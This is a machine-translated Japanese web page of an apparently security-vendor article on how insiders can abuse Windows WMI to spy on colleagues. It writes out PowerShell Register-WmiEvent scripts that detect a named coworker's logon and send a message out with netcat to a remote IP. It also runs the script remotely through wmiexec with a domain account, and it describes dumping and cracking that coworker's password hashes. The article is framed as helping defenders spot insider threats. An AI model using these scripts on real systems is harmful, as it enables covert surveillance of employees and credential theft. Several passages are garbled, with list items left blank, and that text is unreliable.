<!doctype html>
<html class="no-js" lang="ja">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🗺️ 👨🏻‍🌾 🤵🏽 Windows Management Instrumentation（WMI）ガイド：WMI攻撃について 🤟🏽 😰 🙋🏿</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Windows Management Instrumentation（WMI）は、管理者が強力なシステム監視ツールにアクセスできるようにするPowerShellサブシステムです。このツールキットは迅速で効果的なシステム管理ツールとして考えられましたが、誰もがそれを良い目的で使用するわけではありません...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>Windows Management Instrumentation（WMI）ガイド：WMI攻撃について</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/varonis/blog/507068/"><img src="https://habrastorage.org/webt/wm/nj/qv/wmnjqvqbgcfcfxcp3omsbeuk4xi.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Windows Management Instrumentation（WMI）は、管理者が強力なシステム監視ツールにアクセスできるようにするPowerShellサブシステムです。このツールキットは迅速で効果的なシステム管理ツールとして考えられましたが、誰もがそれを良い目的で使用するわけではありません。その助けにより、内部関係者は他の従業員をスパイすることができます。このWMIの脆弱性を知ることで、内部の脅威を簡単に検出して対処できます。</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
この記事では、WMIツールとは何か、それらが必要な理由、およびそれらを使用してシステム内のインサイダーアクティビティを追跡する方法について説明します。また</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;">、無料でダウンロード</font></a><font style="vertical-align: inherit;">できるWMIイベントと内部スパイの詳細なガイドもまとめました</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></a><br>
<a name="habracut"></a><br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 簡単なレビュー：WMIとは何ですか？</font></font></font></h2><br>
<img src="https://habrastorage.org/webt/0t/au/hp/0tauhpqfa_9fk8xebbdasj4e3je.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
具体例を示します。</font><font style="vertical-align: inherit;">WMIを使用すると、たとえば、特定のディレクトリにあるすべての大きなExcelファイルを要求し、特定のサイズ（1 MBなど）のファイルを作成するたびに通知を受け取ることができます。</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">登録-WmiEventコマンドレットが</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">できます</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;">あなたは</font></a><font style="vertical-align: inherit;"> PowerShellでシングル、あまりにも複雑ではない行ですべてこれを行います。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
WMIは善意で多くの目的を果たすことができますが、悪意のあるインサイダーアクティビティのツールにもなります。</font><font style="vertical-align: inherit;">エドワードスノーデンの習慣を持つ人がWMIを使用して同僚をスパイしている様子を簡単に想像できます。</font><font style="vertical-align: inherit;">これを行うために、彼は特別な技術的知識さえ必要としません。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
架空のインサイダーが、同僚のLexが定期的に社会保障番号やクライアントのその他の個人データを含む大きなExcelファイルをダウンロードすることを「誤って」スパイしていると仮定します。</font><font style="vertical-align: inherit;">この場合、目立たないインサイダーは次のようなものを構築できます。</font></font><br>
<br>
<pre><code class="plaintext hljs">Register-WmiEvent -Query "SELECT * FROM __InstanceModificationEvent WITHIN 5 WHERE TargetInstance isa 'CIM_DataFile' and TargetInstance.FileSize &gt; 2000000 and TargetInstance.Path = '\\Users\\lex\\Important' and targetInstance.Drive = 'C:’ and targetInstance.Extension =’xlsx’” -Action $action </code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
このコードは、</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CIM_DataFile</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">オブジェクト</font><font style="vertical-align: inherit;">に</font><font style="vertical-align: inherit;">クエリを実行</font><font style="vertical-align: inherit;">して、指定されたディレクトリにExcelファイルを作成することに関する情報にアクセスし、スクリプトブロックの実行を開始します。</font><font style="vertical-align: inherit;">この記事の終わりに向けて、架空の内部関係者の場合にこのシナリオブロックがどのように見えるかを詳しく見ていきます。</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows Management Toolkitは何に使用されますか？</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
追跡の目的で内部関係者がWMIをどのように使用できるかを探る前に、WMIには多くの正当な用途があることに注意してください。</font><font style="vertical-align: inherit;">このシステムのグローバルな目的は、企業ネットワーク内のデバイスとアプリケーションのすべての制御を統合することです。</font><font style="vertical-align: inherit;">したがって、WMIを使用できます。</font></font><br>
<br>
<ul>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ローカルおよびリモートコンピュータシステムのステータスに関する情報を収集する </font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">リモートコンピュータおよびアプリケーションのセキュリティ設定</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">システムプロパティの設定と編集</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">許可されたユーザーとグループの権限の設定と編集</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">オブジェクトのコード実行とシリアル化（</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一種の "SSH on steroids"</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ドライブラベルの割り当てと編集</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">プロセススケジュールの作成</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">バックアップオブジェクトリポジトリ</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">エラーログを有効または無効にする</font></font></li>
</ul><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
これらの機能はすべて、PowerShellとWMIC（WMIコマンドラインインターフェイス）を使用してアクセスできます。</font><font style="vertical-align: inherit;">ご覧のとおり、WMIにはさまざまなアプリケーションがあり、このシステムを使用すると、コンピュータネットワーク上のさまざまなパラメータを追跡および編集できます。</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows Management Instrumentationアーキテクチャ</font></font></font></h2><br>
<img src="https://habrastorage.org/webt/2w/tf/ij/2wtfijgpvxpx9nijaapuk9a74gg.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
WMIツールキットはWindowsオペレーティングシステムの一部であり、Windows 2000以降のすべてのオペレーティングシステムにプリインストールされています。WMIは次のコンポーネントで構成されています。</font></font><br>
<br>
<ul>
<li><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WMIサービス</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">は、Windows上のWMIシステムの実装です。</font><font style="vertical-align: inherit;">このプロセスは「Windows Management Instrumentation」という名前で表示され、WMIプロバイダー、WMIリポジトリ、および管理アプリケーション間のリンクです。</font><font style="vertical-align: inherit;">このプロセスは、コンピューターの電源を入れると自動的に開始されます。</font></font></li>
<li><strong> </strong> —        ,      WMI.        ,  WMI        ,       Windows,    .</li>
<li><strong> WMI </strong> —  ,       .      WMI   ,      .        Windows.</li>
<li><strong> </strong>  WMI     WMI.      ,     .   WMI       .</li>
<li><strong></strong>,     ,         . ,           .              .</li>
<li><strong> WMI</strong> —   ,      ,   WMI.      .         WMI.</li>
<li><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CMIオブジェクトマネージャー</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">は、管理アプリケーションとWMIプロバイダーの間に位置するシステムです。</font><font style="vertical-align: inherit;">彼女はこれらのプロバイダーにデータを要求し、それをアプリケーションに転送します。</font></font></li>
<li><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WMI API</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">はこれらの操作を実行し、使用するデバイスの種類に縛られることなく、アプリケーションにWMIインフラストラクチャへのアクセスを提供します。</font></font></li>
<li><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WMIコンシューマー</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">は、オブジェクトマネージャーを介してオブジェクトに要求を送信するエンティティです。</font><font style="vertical-align: inherit;">通常、WMIコンシューマーは、PRTGネットワ​​ークモニターなどのアプリケーションまたはPowerShellスクリプトを実行する監視アプリケーションです。</font></font></li>
</ul><br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WMI要求を行う</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
WMI要求を実行する最も簡単な方法は、標準のWindowsコマンドラインでWMICを実行することです。</font><font style="vertical-align: inherit;">次の手順に従って、ローカルコンピューターで使用されているプロセッサに関する情報を取得します。</font></font><br>
<br>
<ol>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">コマンドプロンプトを開く</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WMICと入力してプログラムを起動し、Enterキーを押します </font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WMICコマンドプロンプトウィンドウが表示されます。</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">コマンドプロンプトで、WMI要求を実行できます。</font><font style="vertical-align: inherit;">最も簡単な要求は、次のコマンドを使用して実行できるローカルプロセッサに関する情報を表示することです。</font></font><br>
<pre><code class="plaintext hljs">WMIC CPU</code></pre><br>
</li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">結果はコマンドラインに表示されます。</font></font></li>
</ol><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
以下で説明するほとんどすべてのコマンドは、この方法で実行されます。</font><font style="vertical-align: inherit;">ただし、WMIを使用すると、リモートコンピュータやアプリケーションからなど、プロセッサ情報よりもはるかに詳細な情報を受け取ることができます。</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WMIイベントを使用してシステムを監視するワークショップ</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
このセクションでは、WMIを使用してコマンドを実行し、リモートコンピューター上のプロセスを監視する方法について説明します。</font><font style="vertical-align: inherit;">このような手法を</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ユーザーとエンティティの動作分析システム（UEBA）の</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一部として使用し</font><font style="vertical-align: inherit;">て、システム全体のプロセスを自動的に監視し、</font><font style="vertical-align: inherit;">不審な動作や異常なイベントによって</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;">明らかになる</font></a></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内部の脅威</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">を</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;">チェックでき</font></a><font style="vertical-align: inherit;">ます。</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Impacketのwmiexec機能の使用</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
WMIでは、イベント管理以外にもさまざまな機能を実行できます。その中で、ローカルコンピュータとリモートコンピュータの両方のWindowsウィンドウでプロセスを開始し、コマンドを実行できます。面白くするに</font><font style="vertical-align: inherit;">は、PowerShellセッションで</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wmic</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">プロセスコールcreate 'notepad.exe'コマンドを入力して、古いMicrosoftテキストエディターを開きます。 WMIに含まれているすばらしいwmicコマンドラインツールを使用します。いいでしょう？</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
/ Node：オプションを追加してから、リモートのWindowsコンピューターの名前を追加した場合、適切なアクセス許可があれば、そのコンピューターでメモ帳を実行できます。実用的なレベルでは、wmicはシステム管理者にとって不可欠なツールであることは明らかです。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
再送信を始める前に、同等の</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerShellコマンドレット</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">があることを知っています</font><font style="vertical-align: inherit;">。ただし、wmic構文の方が覚えやすいと思います。</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
WMIを使用して、単純で見えない疑似シェルを作成できたらすばらしいと思います。</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/gu/nl/1j/gunl1jzoplcyeo2axlgjwd6bifw.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 wmiexecで作成された非表示の疑似シェル。</font></font><br>
 <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
運が良ければ、これはImpacketで実行できます。 Amazonテスト環境では、お気に入りの</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wmiexec</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">を使用して、Linux仮想マシン経由でWMIにアクセスしました。 Wmiexecは、疑似シェルを作成する機能を提供します。クライアント側でコマンドが入力されるたびに、このコマンドを実行するためにターゲットコンピューター上に個別のシェルが作成されます。</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
psexecとsmbexecはどちらもWindowsサービスを使用して、リモートシステムでコマンドを実行します。 Smbexecはサービスをすばやく作成して削除するため、サイレントで実行されます。逆に、psexecはサービスを表示しません。</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/vk/mb/ik/vkmbiktrjf4cn49ihyxvhp12u0w.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 wmiexecツールは、cmd.exeを直接実行して、コマンドをリモートで実行します。</font><font style="vertical-align: inherit;">作成されたコマンドは、イベントビューアで確認できます。</font><font style="vertical-align: inherit;">注意を引くWindowsサービスを回避していることに注意してください</font></font><br>
 <br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
。wmiexecツールはサービスにまったく影響せず、代わりに上記のWMI機能を使用してプロセスを直接開始します。</font><font style="vertical-align: inherit;">脅威の発生源を探す場合、セキュリティの専門家がWMIから始めることはめったにありませんが、サービスは通常、攻撃の証拠を探すのに適しています。</font><font style="vertical-align: inherit;">良い動き、wmiexec！</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WMIイベントを使用してユーザーを監視する</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
私はとても賢く、WMIを実験していると思って面白がっていましたが、侵入テストに携わっている人たちは、すべてがどのように機能するかを長い間理解していたことがわかりました。</font><font style="vertical-align: inherit;">Matt Graeberの2015年のブラックハットカンファレンスからの</font><font style="vertical-align: inherit;">素晴らしい</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">プレゼンテーション</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">を</font><font style="vertical-align: inherit;">必ず読んでください</font><font style="vertical-align: inherit;">。そこで彼は、攻撃者がWMIとそのイベント全体の武器をハッキングツールに変える方法について語っています。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
私の話では、技術的な知識はあるが、ハッキングに関する深い知識はなく、他の従業員から信頼されているSnowdenのインサイダーを想像しています。この人は、WMIについてすべてを知っている必要はありません。彼は、リモートコンピューターでの作業とイベントのトリガーに必要なものだけを知る必要があります。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ファイルオブジェクトに加えて、WMIを使用して学習できるオブジェクトの別の興味深いクラス、</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">win32_LogOnSessionがあり</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ます。このベースWindowsオブジェクトをクエリすると、現在システム上にいるユーザーを見つけることができます。その後、Register-WmiEventアクションスクリプトブロックを使用して、新しいユーザーがリモートでログオンしたときにPowerShellスクリプトを実行できます。ポイントを手に入れましたか？攻撃者は、監視するユーザーがターゲットシステムにログインするたびに通知を受け取ることができます。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
これが私がスケッチしたものです：</font></font><br>
<br>
<pre><code class="plaintext hljs">Register-WMIEvent -Query "Select TargetInstance From __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'win32_LogOnSession' AND TargetInstance.LogonType=3" –Action $action</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
次の質問は、スクリプトブロックの実行をプログラムする方法です。私の空想の謎のインサイダーは、特定のユーザー-Cruellに興味を持っています。私たちの悪役はゆっくりとCruellaをスパイしていて、今収集した情報を使用して彼女のワーキングアカウントをクラックする予定です。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
スクリプトブロックのタスクは、ログインしているユーザーを確認し、それがCruellaであるかどうかを判断することです。この目的のために数行のPowerShellコードを記述しましたが、これは明らかに最良の方法ではありません。スクリプトブロックに送信されるイベント情報、つまり新しいユーザーに関する情報は使用しません。今は理解できない理由で障害にぶつかります。これには、架空の内部関係者が持っている、または習得する準備ができている以上の技術的知識が必要です。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
代わりに、gwmi Win32_Processによって返されたユーザーのリストを調べ（このコマンドレットをPowerShellセッションで実行してみてください）、Cruellパラメータと照合しました。</font><font style="vertical-align: inherit;">私の最終決定を賞賛できます：</font></font><br>
<br>
<pre><code class="plaintext hljs">Register-WMIEvent -Query "Select TargetInstance From __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'win32_LogOnSession' AND TargetInstance.LogonType=3" -Action {<font></font>
<font></font>
$names=gwmi Win32_Process|% { $_.GetOwner().User}<font></font>
foreach ($user in $names){<font></font>
<font></font>
    if ($user -eq "cruella") {<font></font>
<font></font>
        echo "cruella logged in"| C:\Users\lex\Documents\nc.exe 172.31.19.75 80<font></font>
    }<font></font>
}<font></font>
<font></font>
<font></font>
}<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Register-WmiEventを使用すると、Win32_Processオブジェクトを定期的に要求するのではなく、再度ログインしたときにのみ開始されるため、ステルスを維持できます。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
私たちのインサイダーは注目を集めないように努めていることを忘れないでください。</font><font style="vertical-align: inherit;">彼女は、psexec、smbexec、またはwmiexec（最も目立たない方法）を介してリモートシステムにアクセスできます。</font><font style="vertical-align: inherit;">ただし、被害者のシステム内を絶えず前後に移動する必要はありません。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
これがWMIイベントを使用する利点です。</font><font style="vertical-align: inherit;">Register-WmiEventからの通知を待ってから、落ち着いて移動できます。</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NetcatとWMIの統合</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
しかし、スクリプトはどのようにして、Cruellaがターゲットコンピューターにログオンしているというホットニュースをもたらすのでしょうか。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
上記のNetcatコマンドを使用していることに気付いた場合は、プラスしてください。</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Netcat</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">は、接続を確立できる有名なユニバーサルユーティリティです（マルウェアのオプション）。これにより、リバース接続を実行したり、ネットワーク経由でメッセージを送信したりできます。私はこの2回目の機会を利用しました。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
上記のスクリプトは、スタンバイモードでNetcatメッセージを送信し、「Cruellaがログインしました」と表示します。任務完了。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
私たちの詐欺師が</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;">secretsdump Impacketツールで</font></a><font style="vertical-align: inherit;">ハッシュをダンプする方法を想像でき</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ます</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、Cruellaクレデンシャルハッシュをクラックしてから、Cruella権限を使用してwmiexecを起動し、より貴重なデータを検索します。</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/ca/en/ni/caennizhyw6u4_yuldedujkbowa.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 Register-WmiEventコードは直接実行できます。</font><font style="vertical-align: inherit;">表示されたイベント識別子に注意してください</font></font><br>
 <br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WMI監視のトラブルシューティング</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
この例の一部として、特定のユーザー、つまりCruellaがログインしたときに警告を発する便利なプログラムを（wmiexecを使用して）リモートで実行したいと考えました。その後、彼女の資格情報を安全にリセットして解読することができました。これは最も目立たない方法です-リモートアクセスとファイルなし。最初に私に思われた唯一の問題は、WMIイベントの一時的な性質でした。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
したがって、PowerShellコマンドラインで-noexitパラメーターを使用して、わいせつな長いRegister-WMIEvent（下記）を囲む必要があります。これにより、Register-Eventの後にPowerShellセッションが確実に保存されるため、イベントが保存されます。</font></font><br>
<br>
<pre><code class="plaintext hljs"> Register-WMIEvent -Query "Select TargetInstance From __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'win32_LogOnSession' AND TargetInstance.LogonType=3" -Action {$names=gwmi Win32_Process|% { $_.GetOwner().User};foreach ($user in $names){if ($user -eq "cruella") {echo "cruella logged in"| C:\Users\lex\Documents\nc.exe 172.31.19.75 80}}}
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
これに取り掛かったとき、$や|などの特殊文字を「変換」し、リテラルとしてPowerShellに直接渡す必要があることに気付きました。</font><font style="vertical-align: inherit;">もう1つの問題：分析エラーが発生したため、縦線の使用を断念せざるを得なくなりました。</font><font style="vertical-align: inherit;">聞かないで。</font><font style="vertical-align: inherit;">徐々に、私はこの長いコード行に行きました：</font></font><br>
<br>
<pre><code class="plaintext hljs">$command="powershell -noexit -C Register-WMIEvent -Query ""Select TargetInstance From __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'win32_LogOnSession' AND TargetInstance.LogonType=3"" -Action {`$names = gwmi Win32_Process; `$users=@(); foreach (`$n in `$names) {`$users += `$n.GetOwner().User}; foreach (`$u in `$users) {if (`$u -eq ""cruella"") {.\wmiexec C:\Users\lex\Documents\nc.exe 172.31.18.92 80 }}}<font></font>
.\wmiexec.exe corp.acme/lex@172.31.46.115 "$command"<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
それは有望であるように見え、ターゲットシステムのWindowsイベントログによると正しく動作しているように見えました。</font><font style="vertical-align: inherit;">しかし、よく見てみるとうまくいかないことに気づきました。</font><font style="vertical-align: inherit;">結局、私はそれを正しい形にすることができると確信していますが、そのためには時間とコーヒー、たくさんのコーヒーが必要になります。</font><font style="vertical-align: inherit;">別のオプションがあります。少し目立たず、ファイルレスではありません。smbclientを使用してスクリプトを転送し、ターゲットコンピュータで直接実行できます。</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/qo/vq/jc/qovqjcy0lqzkf5v3bvaxglub5eu.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 複雑なRegister-Eventコマンドレットをリモートで実行することは、完全に正しいように思えました。</font><font style="vertical-align: inherit;">しかし、それはうまくいきませんでした。</font><font style="vertical-align: inherit;">まあ、</font></font><br>
 <br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ああ。ああは、この段階では、あまりにも経験豊富なスマートではなく、インサイダーが簡単に秘密の監視のためのWMI一時的なイベントを使用することができることを、私の仮定はバラバラにし始めました。</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">観測に定数イベントを使用する必要があるのはなぜですか？ </font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
正しいと同時により深い知識が必要なのは、永続的なWMIイベントを使用することです。恒久的なWMIイベントは、多少複雑ですが、一時的なイベントよりも内部関係者にとって効果的なツールであるだけでなく、内部の脅威をより効果的に監視することもできます。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
